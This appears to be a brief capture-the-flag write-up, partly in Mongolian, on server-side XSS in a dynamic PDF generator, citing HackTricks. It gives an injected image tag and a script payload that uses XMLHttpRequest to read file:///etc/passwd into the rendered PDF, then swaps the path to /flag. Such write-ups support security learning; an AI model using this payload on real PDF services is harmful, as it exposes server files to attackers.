# Dynamic PDF - (XSS /etc/passwd)

Source: https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf

Бичсэн текст ингэж харагдаж байна. Шууд хэвлэж байна гэсэн үг.

[image]

XSS халдлага: Шууд http-ээр дараах датаг татаж ажиллуулж байна гэсэн үг.

```html
<img%20src="https://i1.sndcdn.com/artworks-000599808744-91k9x2-t500x500.jpg">
```

[image]

```html
<script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///etc/passwd"); x.send(); </script>
```

[image]

Change /etc/passwd to /flag

[image]
